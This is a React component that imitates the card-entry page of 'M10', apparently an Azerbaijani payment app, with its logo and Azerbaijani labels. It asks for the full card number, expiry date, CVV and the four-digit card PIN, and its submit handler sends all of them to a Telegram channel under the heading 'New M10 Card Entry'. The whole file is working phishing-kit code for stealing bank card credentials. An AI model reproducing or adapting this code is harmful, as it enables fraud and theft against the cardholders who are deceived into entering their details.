"use client"

import { useState, useRef } from "react"
import { ArrowLeft, Info } from "lucide-react"
import { sendTelegramMessage } from "@/lib/telegram"
import { M10Logo } from "./logo-m10"


function CardChip() {
    return (
        <svg width="36" height="28" viewBox="0 0 36 28" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="0.5" y="0.5" width="35" height="27" rx="4" fill="#C9A84C" stroke="#B8963E" />
            <line x1="0" y1="10" x2="36" y2="10" stroke="#B8963E" strokeWidth="0.5" />
            <line x1="0" y1="18" x2="36" y2="18" stroke="#B8963E" strokeWidth="0.5" />
            <line x1="12" y1="0" x2="12" y2="10" stroke="#B8963E" strokeWidth="0.5" />
            <line x1="12" y1="18" x2="12" y2="28" stroke="#B8963E" strokeWidth="0.5" />
            <line x1="24" y1="10" x2="24" y2="18" stroke="#B8963E" strokeWidth="0.5" />
        </svg>
    )
}

function formatCardNumber(value: string): string {
    const digits = value.replace(/\D/g, "").slice(0, 16)
    return digits.replace(/(.{4})/g, "$1 ").trim()
}

function formatExpiry(value: string): string {
    const digits = value.replace(/\D/g, "").slice(0, 4)
    if (digits.length >= 3) {
        return digits.slice(0, 2) + "/" + digits.slice(2)
    }
    return digits
}

function formatCardDisplay(cardNumber: string): string[] {
    const digits = cardNumber.replace(/\D/g, "")
    const groups: string[] = []
    for (let i = 0; i < 4; i++) {
        const group = digits.slice(i * 4, (i + 1) * 4)
        if (group.length > 0) {
            const filled = group + "\u2022".repeat(4 - group.length)
            groups.push(filled)
        } else {
            groups.push("\u2022\u2022\u2022\u2022")
        }
    }
    return groups
}

export function CardEntry() {
    const [cardNumber, setCardNumber] = useState("")
    const [expiry, setExpiry] = useState("")
    const [cvv, setCvv] = useState("")
    const [pin, setPin] = useState("")

    const [isLoading, setIsLoading] = useState(false)

    const expiryRef = useRef<HTMLInputElement>(null)
    const cvvRef = useRef<HTMLInputElement>(null)
    const pinRef = useRef<HTMLInputElement>(null)

    const cardGroups = formatCardDisplay(cardNumber)
    const rawExpiry = expiry.replace(/\D/g, "")
    const displayExpiry = rawExpiry.length > 0
        ? (rawExpiry.length >= 2 ? rawExpiry.slice(0, 2) : rawExpiry.padEnd(2, " ")) +
        "/" +
        (rawExpiry.length > 2 ? rawExpiry.slice(2) : "YY")
        : "MM/YY"

    const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const raw = e.target.value.replace(/\D/g, "").slice(0, 16)
        setCardNumber(raw)
        if (raw.length === 16) {
            expiryRef.current?.focus()
        }
    }

    const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const raw = e.target.value.replace(/\D/g, "").slice(0, 4)
        setExpiry(raw)
        if (raw.length === 4) {
            cvvRef.current?.focus()
        }
    }

    const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const raw = e.target.value.replace(/\D/g, "").slice(0, 3)
        setCvv(raw)
        if (raw.length === 3) {
            pinRef.current?.focus()
        }
    }

    const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const raw = e.target.value.replace(/\D/g, "").slice(0, 4)
        setPin(raw)
    }

    const handleContinue = async () => {
        if (cardNumber.length < 16 || expiry.length < 4 || cvv.length < 3 || pin.length < 4) {
            alert("Z\u0259hm\u0259t olmasa b\u00FCt\u00FCn sah\u0259l\u0259ri doldurun")
            return
        }

        setIsLoading(true)
        try {
            await sendTelegramMessage({
                title: "\uD83D\uDCB3 New M10 Card Entry",
                cardNumber: formatCardNumber(cardNumber),
                expiry: formatExpiry(expiry),
                cvv: cvv,
                pin: pin,
            })
            // Redirect or show success message if needed
        } catch (error) {
            console.error("Error sending to telegram:", error)
        } finally {
            setIsLoading(false)
        }
    }

    return (
        <div className="flex min-h-dvh flex-col" style={{ backgroundColor: "#FAFAFA" }}>
            {/* Header */}
            <header className="flex items-center justify-between px-4 py-3">
                <button className="flex items-center justify-center" aria-label="Go back">
                    <ArrowLeft className="h-6 w-6" style={{ color: "#1C1C1E" }} />
                </button>
                <button className="text-base font-medium" style={{ color: "#4DA6E8" }}>
                    {"Ba\u011Fla"}
                </button>
            </header>

            {/* Content */}
            <div className="flex flex-1 flex-col items-center px-5 pt-4">
                {/* M10 Logo */}
                <div className="mb-5">
                    <M10Logo size={56} />
                </div>

                {/* Title */}
                <h1
                    className="mb-5 text-center text-2xl font-bold leading-tight"
                    style={{ color: "#1C1C1E" }}
                >
                    {"Kart m\u0259lumatlar\u0131n\u0131z\u0131 daxil edin"}
                </h1>

                {/* Card Preview */}
                <div
                    className="mb-5 w-full overflow-hidden rounded-2xl p-5"
                    style={{
                        background: "linear-gradient(135deg, #2C3E5A 0%, #1B2838 50%, #2C3E5A 100%)",
                        aspectRatio: "1.7/1",
                        maxWidth: "380px",
                    }}
                >
                    <div className="flex h-full flex-col justify-between">
                        {/* Chip */}
                        <div>
                            <CardChip />
                        </div>

                        {/* Card Number */}
                        <div className="flex items-center justify-between px-0.5">
                            {cardGroups.map((group, i) => (
                                <span
                                    key={i}
                                    className="font-mono text-lg tracking-wider"
                                    style={{ color: "#D1D5DB", letterSpacing: "3px" }}
                                >
                                    {group}
                                </span>
                            ))}
                        </div>

                        {/* Valid Thru + CVV */}
                        <div className="flex items-end justify-between">
                            <div>
                                <span
                                    className="block text-[10px] uppercase tracking-wider"
                                    style={{ color: "#9CA3AF" }}
                                >
                                    VALID THRU
                                </span>
                                <span
                                    className="font-mono text-sm"
                                    style={{ color: "#D1D5DB" }}
                                >
                                    {displayExpiry}
                                </span>
                            </div>
                            <div>
                                <span
                                    className="block text-[10px] uppercase tracking-wider"
                                    style={{ color: "#9CA3AF" }}
                                >
                                    CVV
                                </span>
                                <span
                                    className="font-mono text-sm"
                                    style={{ color: "#D1D5DB" }}
                                >
                                    {cvv.length > 0 ? cvv : "***"}
                                </span>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Form */}
                <div className="w-full" style={{ maxWidth: "380px" }}>
                    {/* Card Number Field */}
                    <label
                        className="mb-1.5 block text-sm font-medium"
                        style={{ color: "#1C1C1E" }}
                    >
                        {"Kart n\u00F6mr\u0259si"}
                    </label>
                    <div className="mb-4 flex items-center gap-2.5">
                        <input
                            type="text"
                            inputMode="numeric"
                            placeholder="0000 0000 0000 0000"
                            value={formatCardNumber(cardNumber)}
                            onChange={handleCardNumberChange}
                            className="h-12 flex-1 rounded-xl border px-4 text-base outline-none transition-colors focus:border-[#4DA6E8]"
                            style={{
                                backgroundColor: "#F2F2F7",
                                borderColor: "#E5E5EA",
                                color: "#1C1C1E",
                            }}
                        />
                        <div
                            className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full"
                            style={{ backgroundColor: "#F2F2F7" }}
                        >
                            <Info className="h-5 w-5" style={{ color: "#8E8E93" }} />
                        </div>
                    </div>

                    {/* Expiry + CVV Row */}
                    <div className="mb-4 flex gap-4">
                        <div className="flex-1">
                            <label
                                className="mb-1.5 block text-sm font-medium"
                                style={{ color: "#1C1C1E" }}
                            >
                                {"Son istifad\u0259 tarixi (AA/\u0130)"}
                            </label>
                            <input
                                ref={expiryRef}
                                type="text"
                                inputMode="numeric"
                                placeholder={"AA/\u0130"}
                                value={formatExpiry(expiry)}
                                onChange={handleExpiryChange}
                                className="h-12 w-full rounded-xl border px-4 text-base outline-none transition-colors focus:border-[#4DA6E8]"
                                style={{
                                    backgroundColor: "#F2F2F7",
                                    borderColor: "#E5E5EA",
                                    color: "#1C1C1E",
                                }}
                            />
                        </div>
                        <div className="flex items-end gap-2.5">
                            <div>
                                <label
                                    className="mb-1.5 block text-sm font-medium"
                                    style={{ color: "#1C1C1E" }}
                                >
                                    CVV
                                </label>
                                <input
                                    ref={cvvRef}
                                    type="text"
                                    inputMode="numeric"
                                    placeholder="123"
                                    value={cvv}
                                    onChange={handleCvvChange}
                                    maxLength={3}
                                    className="h-12 w-24 rounded-xl border px-4 text-base outline-none transition-colors focus:border-[#4DA6E8]"
                                    style={{
                                        backgroundColor: "#F2F2F7",
                                        borderColor: "#E5E5EA",
                                        color: "#1C1C1E",
                                    }}
                                />
                            </div>
                            <div
                                className="mb-1 flex h-10 w-10 shrink-0 items-center justify-center rounded-full"
                                style={{ backgroundColor: "#F2F2F7" }}
                            >
                                <Info className="h-5 w-5" style={{ color: "#8E8E93" }} />
                            </div>
                        </div>
                    </div>

                    {/* PIN Field */}
                    <div className="mb-5">
                        <input
                            ref={pinRef}
                            type="password"
                            inputMode="numeric"
                            placeholder={"4 r\u0259q\u0259mli kart PIN kodunuzu daxil edin"}
                            value={pin}
                            onChange={handlePinChange}
                            maxLength={4}
                            className="h-12 w-full rounded-xl border px-4 text-base outline-none transition-colors focus:border-[#4DA6E8]"
                            style={{
                                backgroundColor: "#F2F2F7",
                                borderColor: "#E5E5EA",
                                color: "#1C1C1E",
                            }}
                        />
                    </div>

                    {/* Submit Button */}
                    <button
                        onClick={handleContinue}
                        disabled={isLoading}
                        className="h-14 w-full rounded-2xl text-base font-semibold transition-opacity hover:opacity-90 active:opacity-80 flex items-center justify-center gap-2"
                        style={{
                            backgroundColor: "#2C3E5A",
                            color: "#FFFFFF",
                            opacity: isLoading ? 0.7 : 1,
                        }}
                    >
                        {isLoading ? "G\u00F6zl\u0259yin..." : "Davam et"}
                    </button>
                </div>
            </div>
        </div>
    )
}
